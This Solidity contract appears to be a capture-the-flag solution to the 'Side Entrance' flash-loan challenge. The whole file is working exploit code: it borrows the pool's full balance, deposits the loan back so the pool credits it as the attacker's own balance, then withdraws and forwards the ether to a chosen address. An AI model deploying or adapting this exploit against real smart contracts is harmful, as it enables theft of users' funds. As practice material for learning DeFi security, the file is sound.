// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

interface ISideEntranceLenderPool {
    function flashLoan(uint256) external;
    function deposit() external payable;
}

contract SideEntranceAttack {
    SideEntranceLenderPool private immutable pool;
    address payable withdrawAddress;

    constructor(address newPoolAddress, address newWithdrawAddress) {
        pool = SideEntranceLenderPool(newPoolAddress);
        withdrawAddress = payable(newWithdrawAddress);
    }

    receive() external payable {
        withdrawAddress.transfer(msg.value);
    }

    function attack() external {
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);
        pool.withdraw();
    }
  
    function execute() payable external {
        pool.deposit{value: msg.value}();
    }
}
